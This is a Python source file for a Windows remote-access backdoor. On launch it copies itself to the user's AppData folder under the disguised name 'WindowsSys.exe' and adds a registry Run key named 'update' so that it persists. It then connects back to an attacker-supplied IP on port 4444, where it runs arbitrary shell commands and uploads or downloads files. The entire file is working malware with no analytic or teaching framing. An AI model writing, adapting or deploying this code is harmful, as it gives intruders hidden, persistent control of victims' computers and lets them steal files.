#!/usr/bin/env python

import shutil
import socket
import subprocess
import pickle
import os
import base64
import sys

HEADERSIZE = 10

class Backdoor:
    def __init__(self, ip, port):
        self.persistence()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port ))

    
    def persistence(self):
        efile_loc = os.environ["appdata"] + "\\WindowsSys.exe"
        if not os.path.exists(efile_loc):    
            shutil.copyfile(sys.executable, efile_loc)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + efile_loc + '"', shell=True)

    
    def reliable_send(self, data):
        pickle_data = pickle.dumps(data)
        pickle_data = bytes(f"{len(pickle_data):<{HEADERSIZE}}", 'utf-8') + pickle_data
        self.connection.send(pickle_data)

    def reliable_receive(self):
        full_pickle_data = b''
        new_pickle_data = True
        while True:
            pickle_data = self.connection.recv(16)
            if new_pickle_data:
                length = int(pickle_data[:HEADERSIZE])
                new_pickle_data = False
            full_pickle_data += pickle_data

            if len(full_pickle_data) - HEADERSIZE == length:
                new_pickle_data = True
                return pickle.loads(full_pickle_data[HEADERSIZE:])


    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)


    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Moved to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return
 
    def run(self):
        while True:
            command = self.reliable_receive()
            
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_res = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_res = self.read_file(command[1])
                elif command[0] == "upload":
                    command_res = self.write_file(command[1], command[2])
                else:
                    command_res = self.execute_system_command(command)
            except Exception:
                command_res = "[-] Error"    
            
            self.reliable_send(command_res)

try:
    my_backdoor = Backdoor("ip adress", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()